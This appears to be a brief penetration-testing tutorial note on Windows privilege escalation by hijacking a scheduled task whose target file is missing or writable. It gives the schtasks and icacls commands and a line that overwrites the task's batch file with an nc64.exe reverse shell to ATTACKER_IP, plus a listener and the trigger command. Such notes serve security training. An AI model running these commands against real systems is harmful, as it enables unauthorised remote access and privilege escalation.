You may see a scheduled task that either:
- **Lost its binary:** The task is set to run a program but the file it points to no longer exists. You could ***place your file at that path***.
- **Binary you can modify:** Task runs a binary that still exists, and you have permission to modify it.

**List Scheduled Tasks:**
```
schtasks /query /tn vulntask /fo list /v
```
- `/query:` list all scheduled tasks
- `/tn:` task name
- `/fo list:` format the output as a list

Note: `Task To Run` parameter is the one matter to us.

**Check File Permissions:**
```
icacls C:\tasks\schtask.bat
```
Note: If we see this `BUILTIN\Users:(I)(F)` than even **Users have full control**.

**Setup a Reverse Shell:**
```
echo nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

```
nc -nvlp 4444
```

**Run the Task:**
```
schtasks /run /tn vulntask
```